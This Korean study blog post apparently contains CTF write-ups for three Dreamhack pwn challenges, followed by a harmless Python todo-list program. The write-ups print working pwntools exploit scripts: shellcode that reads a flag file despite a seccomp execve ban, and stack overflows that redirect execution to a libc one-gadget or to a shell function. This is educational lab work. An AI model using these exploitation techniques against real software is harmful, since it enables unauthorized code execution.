---
title: "페이즈 12주차"
published: 2026-08-12
description: "Can you hear me?"
image: ""
tags:
  - Phase
category: "Phase"

protected: true
password: "I_Think_Linux_Is_Awesome"
---

# 문제풀이
---
# **shell_basic**
```c
void banned_execve() {
  scmp_filter_ctx ctx;
  ctx = seccomp_init(SCMP_ACT_ALLOW);
  if (ctx == NULL) {
    exit(0);
  }
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), 0);

  seccomp_load(ctx);
}
```
이부분을 보니 execve를 못쓰도록 막는것 같다 ……
그래서 구글링을 해보니 shellcraft 라는 함수로 쉘코드를 쓸 수 있다고 한다.
shellcraft.sh()를 사용하면 막히는것 같다…
그래서 쉘을 실행하는 대신 flag 파일을 직접 읽어서 출력하면 될 것 같았다
shellcraft에  cat이 있어서 사용했다
```c
from pwn import *

p = remote("host3.dreamhack.games", 17395)

context.arch = "amd64"

r = "/home/shell_basic/flag_name_is_loooooong"



payload = asm(shellcraft.cat(r))

p.sendafter(b"shellcode: ", payload)

p.interactive()
```
```plain text
payload = asm(shellcraft.cat(r))
```
를 사용해서 flag 파일의 내용을 읽어서 출력하는 쉘코드를 만들었다
asm()으로 실제 기계어 바이트로 변환해줬다
![](/notion/phase-12-a8af8283-9629-46c0-9321-76e1f0673753.png)
성공했다!
---
# **oneshot**
```c
char msg[16];
size_t check = 0;

initialize();

printf("stdout: %p\n", stdout);

printf("MSG: ");
read(0, msg, 46);

if(check > 0) {
    exit(0);
}

printf("MSG: %s\n", msg);
memset(msg, 0, sizeof(msg));
return 0;
```
코드를 보면 msg 는 16바이트인데 read 에서는 최대 46바이트를 입력받고 있다.
그래서 msg 보다 더 많은 값을 입력할 수 있고 BOf 가 터진다
그런데 바로 아래를 보면
```c
if(check > 0) {
    exit(0);
}
```
이 부분이 있다.
그래서 아무렇게나 값을 덮으면 안 되고, check는 0으로 유지하면서 그 뒤에 있는 return address까지 덮어야 한다.
그리고 위쪽을 보면
```c
printf("stdout: %p\n", stdout);
```
을 통해 stdout의 실제 주소를 출력해주고 있다.
stdout은 libc에 있는 값이기 때문에 출력된 stdout의 주소에서 libc에 있는 stdout 의 offset을 빼면 libc base 주소를 구할 수 있다
---
## one-shot gadget
문제 이름이 oneshot인 만큼 one-shot gadget을 사용해보기로 했다
 사용할 수 있는 gadget을 확인했다
![](/notion/phase-12-e0d8ffb8-92c7-4fd0-868d-0c456f37ec51.png)
확인해보니 0x45216이라는 gadget이 있었고, 이 gadget은 rax가 0이어야 실행되는 조건이 있었다
그래서 GDB로 main 함수가 끝나는 부분을 확인해봤다
![](/notion/phase-12-70978378-79bb-42ee-ac82-3c7c38486ab1.png)
main 함수가 끝나기 전에 eax에 0을 넣고 있기 때문에 ret이 실행될 때 rax도 0인 상태가 된다.
따라서 0x45216 one-shot gadget을 사용하면 조건을 만족시킬 수 있다.
libc의 stdout offset을 이용해서 libc base를 구하고, 거기에 one-shot gadget의 offset을 더해서 실제 gadget 주소를 구했다
```python
from pwn import *

p = remote("host3.dreamhack.games", 18111)
libc = ELF("./libc.so.6")

p.recvuntil(b"stdout: ")
stdout = int(p.recvline().strip(), 16)

libc_base = stdout - libc.symbols["_IO_2_1_stdout_"]
one_gadget = libc_base + 0x45216

payload = b"A" * 0x18
payload += p64(0)
payload += b"B" * 8
payload += p64(one_gadget)[:6]

p.sendafter(b"MSG: ", payload)
p.interactive()
```
![](/notion/phase-12-b2f08ae2-8f91-4c55-9557-44aa6e753175.png)
성공했다!
---
# cherry
```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}


void flag() {
  char *cmd = "/bin/sh";
  char *args[] = {cmd, NULL};
  execve(cmd, args, NULL);
}

int main(int argc, char *argv[]) {
    int stdin_fd = 0;
    int stdout_fd = 1;
    char fruit[0x6] = "cherry";
    int buf_size = 0x10;
    char buf[0x6];

    initialize();

    write(stdout_fd, "Menu: ", 6);
    read(stdin_fd, buf, buf_size);
    if(!strncmp(buf, "cherry", 6)) {
        write(stdout_fd, "Is it cherry?: ", 15);
        read(stdin_fd, fruit, buf_size);
    }

    return 0;
}
```
코드를 보면 buf의 크기는 6바이트인데 buf_size는 16바이트라서 처음부터 buf에 16바이트를 입력받고 있다
그래서  buf 뒤에 있는 다른 변수까지 덮을 수 있다
![](/notion/phase-12-494d3391-b267-420b-a5a8-3d8738edcfb9.png)
디버깅을 해보니 buf와 buf_size가 스택에서 가까운 위치에 있었다.
buf에서 buf_size까지의 거리가 12바이트이고 buf_size는 4바이트이기 때문에, 처음 입력으로 buf_size의 값을 덮을 수 있었다
read에서 처음부터 buf_size만큼 입력을 받기 때문에 첫 번째 입력에서 buf_size를 원하는 값으로 바꿀 수 있다
```c
if(!strncmp(buf, "cherry", 6)) {
```
그런데 앞의 6바이트가 cherry와 같아야 두 번째 read가 실행된다.
그래서 입력은 cherry로 시작하게 만들었다
```python
payload = b'cherry'
payload += b'A' * 10
```
이렇게 하면 총 16바이트를 입력하게 된다
여기서 buf 뒤쪽의 값도 같이 덮이기 때문에 buf_size까지 바꿀 수 있다
```c
read(stdin_fd, fruit, buf_size);
```
첫 번째 입력에서 buf_size를 크게 바꿔놓았기 때문에 원래 fruit의 크기인 6바이트보다 훨씬 많은 데이터를 입력할 수 있다
따라서 두 번째 read에서도 BOF가 발생하고  이번에는 스택을 계속 덮어서 리턴 주소까지 도달할 수 있다.
```c
void flag() {
    char *cmd = "/bin/sh";
    char *args[] = {cmd, NULL};
    execve(cmd, args, NULL);
}
```
flag() 함수가 실행되면 /bin/sh를 실행하기 때문에 return address를 flag()의 주소로 바꾸면 쉘을 얻을 수 있다.
---
```python
from pwn import *

p = remote('host3.dreamhack.games',18488)

e = ELF('./chall')

flag = e.symbols['flag']

p.recvuntil(b': ')

payload = b'cherry'

payload += b'A' * 10


p.send(payload)

p.recvuntil(b': ')

payload = b'a' * 26


payload += p64(flag)

p.send(payload)


p.interactive()
```
![](/notion/phase-12-0dd773a3-ea8f-43ea-b53d-3a4b692583a0.png)
성공했다!
---
# 파이썬 프로그램
음…. 솔직히 뭘 해야할지 잘 모르겠어서  Todolist 프로그램을 만들었습니다
## 할일 저장
할 일 하나마다 제목, 우선순위, 마감일, 완료 여부가 필요해서 딕셔너리로 만들었습니다
```python
todo = {
    "title": title,
    "pri": pri,
    "due": due,
    "done": False
}
```
그런데 프로그램을 그냥 종료하면 리스트에 있던 내용이 다 사라져서  json.dump()를 사용해서 todo_data.json 파일에 저장하고, 프로그램을 다시 실행하면 json.load()를 사용해서 저장된 내용을 불러오게 만들었습니다
```python
def save():
    with open(file, "w", encoding="utf-8") as f:
        json.dump(todos, f, ensure_ascii=False, indent=2)
```
##  할일 추가
할 일을 추가할 때 제목, 우선순위, 마감일을 입력받음
우선순위는 상 / 중 / 하 중 하나만 받도록 했다. 다른 값을 입력하면 프로그램이 오류가 나지 않고 그냥 중으로 설정됨
```python
if pri not in ("상", "중", "하"):
    pri = "중"
```
마감일은 2026-08-20 같은 형식으로 입력받음
datetime.strptime()를 사용해서 날짜 형식이 맞는지 확인하고, 잘못 입력하면 마감일 없이 저장되도록 했음
##  할일 삭제
먼저 현재 할 일 목록을 보여주고, 삭제할 번호를 입력받음
입력한 번호를 리스트의 인덱스로 사용해서 pop()으로 삭제
```python
removed = todos.pop(idx)
```
## 완료 처리
할 일을 완료했다고 해서 목록에서 바로 삭제하지 않고, done의 값을 True로 
```python
todos[idx]["done"] = True
```
그리고 실수로 완료 처리했을 때 다시 미완료로 바꿀 수 있도록 undone_todo() 함수도 만듬
```python
todos[idx]["done"] = False
```
## 정렬 & 필터링
우선순위순으로 볼 때는 상, 중, 하를 숫자로 바꿔서 정렬
상은 0, 중은 1, 하는 2로 설정해서 숫자가 작은 순서대로 정렬되게 함
```python
order = {"상": 0, "중": 1, "하": 2}

idx_list = sorted(
    range(len(todos)),
    key=lambda i: order[todos[i]["pri"]]
)
```
마감일순으로 볼 때는 마감일이 없는 할 일이 맨 뒤로 가도록 정렬
또 완료된 할 일만 보거나 미완료된 할 일만 볼 수도 있도록 show_list() 함수에 조건을 넣음
## 코드
```python
import json
import os
from datetime import datetime

file = "todo_data.json"

#할일 목록
todos = []

def load():
    global todos

    if os.path.exists(file):
        with open(file, "r", encoding="utf-8") as f:
            todos = json.load(f)
        print("파일 불러왔습니다")
    else:
        todos = []

def save():
    with open(file, "w", encoding="utf-8") as f:
        json.dump(todos, f, ensure_ascii=False, indent=2)

def add():
    title = input("할일 제목: ").strip()

    if title == "":
        print("제목 입력")
        return

    pri = input("우선순위 (상/중/하, 그냥 엔터누르면 중): ").strip()

    if pri == "":
        pri = "중"

    if pri not in ("상", "중", "하"):
        print("상/중/하 중에 입력, 중으로 설정합니다")
        pri = "중"

    due = input("마감일 없으면 엔터): ").strip()

    if due != "":
        try:
            datetime.strptime(due, "%Y-%m-%d")
        except ValueError:
            print("날짜 형식이 이상해서 마감일 없이 저장")
            due = ""

    todo = {
        "title": title,
        "pri": pri,
        "due": due,
        "done": False
    }

    todos.append(todo)
    save()
    print(f"'{title}' 추가 완료")

def delete():
    show_list()

    try:
        idx = int(input("삭제할 번호: "))
    except ValueError:
        print("숫자 입력")
        return

    if idx < 0 or idx >= len(todos):
        print("번호 없음 !")
        return

    removed = todos.pop(idx)
    save()
    print(f"'{removed['title']}' 삭제")

def done_todo():
    show_list()

    try:
        idx = int(input("완료 처리할 번호: "))
    except ValueError:
        print("숫자 입력")
        return

    if idx < 0 or idx >= len(todos):
        print("번호 없음 ")
        return

    todos[idx]["done"] = True
    save()
    print(f"'{todos[idx]['title']}' 완료 처리")

def undone_todo():
    show_list()

    try:
        idx = int(input("미완료로 되돌릴 번호: "))
    except ValueError:
        print("번호 없음 ")
        return

    if idx < 0 or idx >= len(todos):
        print("번호 없음 ")
        return

    todos[idx]["done"] = False
    save()
    print(f"'{todos[idx]['title']}'  미완료")

def show_list(only_done=None, sort_key=None):
    if len(todos) == 0:
        print("할일이 없습니다")
        return

    if sort_key == "pri":
        order = {"상": 0, "중": 1, "하": 2}
        idx_list = sorted(
            range(len(todos)),
            key=lambda i: order[todos[i]["pri"]]
        )

    elif sort_key == "due":
        idx_list = sorted(
            range(len(todos)),
            key=lambda i: (todos[i]["due"] == "", todos[i]["due"])
        )

    else:
        idx_list = range(len(todos))

    print()

    for i in idx_list:
        t = todos[i]

        if only_done is not None and t["done"] != only_done:
            continue

        status = "완료" if t["done"] else "미완료"
        due_text = t["due"] if t["due"] != "" else "없음"

        print(
            f"{i}. [{status}]{t['title']} "
            f"(우선순위:{t['pri']}, 마감일:{due_text})"
        )

    print()

def stats():
    if len(todos) == 0:
        print("할일이 없습니다")
        return

    total = len(todos)
    done_cnt = 0

    for t in todos:
        if t["done"]:
            done_cnt += 1

    rate = done_cnt / total * 100

    high = 0
    mid = 0
    low = 0

    for t in todos:
        if t["pri"] == "상":
            high += 1
        elif t["pri"] == "중":
            mid += 1
        else:
            low += 1

    print(f"전체{total}개 중{done_cnt}개 완료 (완료율{rate:.1f}%)")
    print(f"우선순위 - 상:{high}, 중:{mid}, 하:{low}")

def menu():
    print()
    print("=== TODLIST =")
    print("1. 할일 추가")
    print("2. 할일 삭제")
    print("3. 완료 처리")
    print("4. 미완료로 바꾸기")
    print("5. 전체 목록")
    print("6. 우선순위순으로 보기")
    print("7. 마감일순으로 보기")
    print("8. 완료된것만 보기")
    print("9. 미완료된것만 보기")
    print("10. 진행도")
    print("0. 종료")
    print("==========")

def main():
    load()

    while True:
        menu()
        cmd = input("번호 선택: ").strip()

        if cmd == "1":
            add()

        elif cmd == "2":
            delete()

        elif cmd == "3":
            done_todo()

        elif cmd == "4":
            undone_todo()

        elif cmd == "5":
            show_list()

        elif cmd == "6":
            show_list(sort_key="pri")

        elif cmd == "7":
            show_list(sort_key="due")

        elif cmd == "8":
            show_list(only_done=True)

        elif cmd == "9":
            show_list(only_done=False)

        elif cmd == "10":
            stats()

        elif cmd == "0":
            print("프로그램을 종료합니다")
            break

        else:
            print("번호 없음 다시 선택ㄱㄱ")

if __name__ == "__main__":
    main()
```
